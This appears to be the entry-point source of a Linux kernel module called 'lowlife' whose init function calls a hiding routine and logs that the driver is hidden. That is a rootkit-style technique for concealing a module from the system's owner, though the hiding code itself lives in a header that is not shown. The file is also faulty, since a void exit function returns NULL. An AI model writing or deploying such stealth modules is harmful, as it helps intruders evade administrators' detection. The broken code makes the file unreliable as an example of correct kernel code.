#include <linux/module.h>
#include "lowlife.h"

static int __init low_init(void)
{
    low_drv_hide();
    printk(KERN_INFO "driver lowlife is hidden.\n");
    return 0;
}

static void __exit low_exit(void)
{
    return NULL;
}

module_init(low_init);
module_exit(low_exit);
